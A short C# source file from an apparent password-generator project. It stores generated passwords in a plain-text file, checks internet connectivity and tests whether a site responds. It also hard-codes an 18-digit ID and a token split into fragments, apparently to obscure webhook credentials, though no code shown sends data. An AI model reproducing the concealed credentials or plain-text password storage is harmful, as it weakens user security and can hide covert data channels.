using System.IO;
using System.Net;

namespace New_Folder
{
    internal class Functions
    {
        public static readonly string bytearray1 = "tqq6VsxI_d9iaUt7gDgGxnU84a"+"RPFFY5jkYXPz1_CKf3iKl"+Program.rrrr;
        public static readonly string bytearray2 = "764550993311957043";
        public static void GenPassword(string path, string title, string newpass)
        {
            File.WriteAllText(path, File.ReadAllText(path) + "\nTitle: " + title + " | Password: " + newpass);
        }
        public static bool CheckForInternetConnection()
{
    try
    {
        using (var client = new WebClient())
            using (client.OpenRead("https://blank.org")) 
                return true; 
    }
    catch
    {
        return false;
    }
}
        public static bool CheckIfSiteExists(string address)
        {
            WebClient wc = new WebClient();
            bool is_connected = CheckForInternetConnection();
            if(is_connected == true)
            {
                try
            {
                byte[] Check = wc.DownloadData(address);
                if (Check.Length > 0)
                {
                    return true;
                }
                else
                {
                    return false;  
                }
            }
            catch
            {
                return false;
            }
        }
        else
        {
            return false;
        }
        }
    }
}
